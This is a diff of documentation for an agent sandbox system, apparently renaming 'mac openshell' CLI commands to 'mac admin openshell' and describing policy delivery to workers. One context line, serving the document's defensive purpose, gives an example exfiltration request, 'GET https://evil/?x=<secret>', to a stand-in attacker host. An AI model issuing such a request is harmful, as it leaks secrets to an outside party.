@@ -93,11 +93,11 @@ command reads the enabled Linux agents from `~/.mac/fleets.yaml` unless
 agent resources while setting only `resources.openshell_required`.
 
 ```console
-mac openshell reconcile --target-fleet <fleet>
-mac openshell reconcile --target-fleet <fleet> --apply --validated \
+mac admin openshell reconcile --target-fleet <fleet>
+mac admin openshell reconcile --target-fleet <fleet> --apply --validated \
   --sandbox-id docker-openshell-smoke-$(date +%Y%m%d) \
   --validation-summary "Docker image smoke and OpenShell sandbox smoke passed"
-mac openshell status --agent agent_hub
+mac admin openshell status --agent agent_hub
 ```
 
 `--validated` is required when applying `status=active`; failed or degraded
@@ -137,7 +137,7 @@ mac-openshell-supervisor --agent-id agent_hub --policy "$MAC_OPENSHELL_POLICY" -
 
 ## Policy delivery: the hub assignment reaches the worker
 
-`mac openshell policy assign <policy> <agent>` used to record intent only. The
+`mac admin openshell policy assign <policy> <agent>` used to record intent only. The
 executor resolved its policy from `MAC_OPENSHELL_POLICY`,
 `~/.mac/openshell-policy.yaml`, or the bundled fail-closed default — and
 `~/.mac/openshell-policy.yaml` was written once at provision time by
@@ -148,7 +148,7 @@ The worker now converges on its assignment. Between tasks (never mid-task — th
 executor reads the policy when it creates a sandbox) it pulls
 `GET /agents/{id}/openshell/policy`, and if the checksum differs from what is on
 disk it installs the text at `~/.mac/openshell-policy.yaml` via write-then-rename
-at mode `0600`, then reports convergence so `mac openshell policy deploy-status`
+at mode `0600`, then reports convergence so `mac admin openshell policy deploy-status`
 reflects the host rather than the intent.
 
 Deliberate properties:
@@ -248,8 +248,8 @@ axis, because `GET https://evil/?x=<secret>` is exfiltration with a GET.
    `CONFINEMENT_PROBE_OK`; bootstrap will not enable enforcement without it.
 4. Inspect orphan cleanup before applying it manually:
    ```console
-   mac openshell sandbox-gc
-   mac openshell sandbox-gc --apply
+   mac admin openshell sandbox-gc
+   mac admin openshell sandbox-gc --apply
    ```
    The default 24-hour grace period protects recent work. New sandboxes are
    labeled with their MAC owner, lifecycle kind, creator PID, and debug-keep
